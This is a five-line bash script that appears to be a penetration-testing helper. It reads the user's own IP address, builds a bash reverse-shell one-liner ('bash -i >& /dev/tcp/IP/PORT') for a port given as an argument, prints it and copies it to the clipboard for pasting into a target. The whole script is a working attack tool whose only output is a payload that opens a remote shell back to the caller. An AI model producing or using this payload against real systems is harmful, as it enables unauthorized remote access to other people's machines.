#!/bin/bash
IP=$( IP_No_Clip );
New_IP=$( echo -n $IP );
echo "bash -i >& /dev/tcp/$New_IP/$1 0>&1";
echo "bash -i >& /dev/tcp/$New_IP/$1 0>&1" | clip;
